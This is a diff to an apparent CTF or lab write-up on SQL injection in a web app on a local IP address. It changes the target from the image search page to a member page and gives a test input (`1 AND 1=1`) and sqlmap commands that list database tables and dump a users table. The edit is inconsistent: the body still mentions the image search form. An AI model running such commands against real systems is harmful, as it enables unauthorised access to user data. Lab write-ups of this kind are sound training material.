@@ -1,4 +1,4 @@
-# 02_Unsecure_img_search
+# 02_Sql_injection_member
 
 The GET parameter in the image search form is vulnerable.  
 
@@ -12,13 +12,13 @@ In the search field, search `1 AND 1=1`
 
 Open terminal (Powershell), run  
 ```bash
-python sqlmap.py --url="http://192.168.1.59/index.php?page=searchimg&id=1&Submit=Submit# --tables
+python sqlmap.py --url="http://192.168.1.59/index.php?page=member&id=3&Submit=Submit## --tables
 ```  
 
 This displays all the databases & their tables.  
 Thereafter tables can be dumped  
 ```bash
-python sqlmap.py --url="http://192.168.1.59/index.php?page=searchimg&id=1&Submit=Submit# --dump -T users
+python sqlmap.py --url="http://192.168.1.59/index.php?page=member&id=3&Submit=Submit# --dump -T users
 ```  
 where `users` refers to the table name  
 
